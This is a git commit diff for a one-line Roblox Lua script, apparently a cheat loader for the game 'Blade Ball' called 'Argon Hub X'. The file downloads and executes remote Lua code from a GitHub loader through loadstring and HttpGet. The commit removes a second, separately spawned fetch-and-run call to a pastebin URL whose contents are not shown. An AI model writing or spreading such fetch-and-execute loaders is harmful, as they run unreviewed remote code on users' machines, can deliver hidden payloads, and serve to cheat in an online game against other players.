f2aa8cf1cad623c22f267754c12feb97a7b3cdba
Scriptsnet <maramarajadematthew@gmail.com>
2026-02-22 20:07:37 +0800

    Update Argon-Hub-X-BladeBall-OP.lua

--- Argon-Hub-X-BladeBall-OP.lua
+++ Argon-Hub-X-BladeBall-OP.lua
@@ -1,1 +1,1 @@
-task.spawn(function()loadstring(game:HttpGet("https://pastebin.com/raw/h1L8QtK4"))()end)loadstring(game:HttpGet("https://raw.githubusercontent.com/AgentX771/ArgonHubX/main/Loader.lua"))()
+task.spawn(function()loadstring(game:HttpGet(""))()end)loadstring(game:HttpGet("https://raw.githubusercontent.com/AgentX771/ArgonHubX/main/Loader.lua"))()
